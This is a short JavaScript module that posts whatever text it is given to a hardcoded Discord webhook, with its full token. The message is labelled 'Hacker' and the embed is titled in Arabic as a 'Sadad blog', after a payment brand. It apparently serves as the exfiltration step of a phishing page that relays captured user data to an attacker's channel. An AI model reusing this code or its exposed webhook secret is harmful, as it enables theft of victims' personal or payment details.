import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323278960565420146/d7d3kw6fk_ZM6UeDAMxFYusoNFqukZjlAGK1cK2CGLLe-xgDK6mXwCr24DJGfyjmVE23",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
